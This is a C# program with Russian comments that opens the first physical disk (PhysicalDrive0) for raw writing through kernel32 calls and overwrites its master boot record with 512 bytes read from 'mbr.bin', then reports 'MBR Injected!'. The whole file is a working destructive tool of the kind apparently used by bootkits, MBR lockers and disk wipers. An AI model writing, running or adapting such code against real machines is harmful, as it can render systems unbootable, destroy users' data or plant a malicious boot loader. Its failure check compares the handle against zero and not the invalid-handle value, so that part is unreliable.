using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    const uint GENERIC_READ = 0x80000000;
    const uint GENERIC_WRITE = 0x40000000;
    const uint OPEN_EXISTING = 3;

    static void Main(string[] args)
    {
        string drivePath = @"\\.\PhysicalDrive0"; // Путь к физическому диску
        byte[] mbrData = new byte[512]; // MBR имеет размер 512 байт

        // Заполнение mbrData данными MBR (например, из файла)
        // Здесь вы должны заполнить mbrData данными вашего MBR
        // Например, чтение из файла:
        File.ReadAllBytes("mbr.bin").CopyTo(mbrData, 0);
        // Замените на свой вариант
        IntPtr hDrive = CreateFile(
            drivePath,
            GENERIC_WRITE,
            0,
            IntPtr.Zero,
            OPEN_EXISTING,
            0,
            IntPtr.Zero);

        if (hDrive == IntPtr.Zero)
        {
            Console.WriteLine("ERROR! Disk doesn't open!");
            return;
        }

        uint bytesWritten;
        bool result = WriteFile(
            hDrive,
            mbrData,
            (uint)mbrData.Length,
            out bytesWritten,
            IntPtr.Zero);

        if (result)
        {
            Console.WriteLine("MBR Injected!");
        }
        else
        {
            Console.WriteLine("ERROR! MBR Injection errored!");
        }

        CloseHandle(hDrive);
    }
}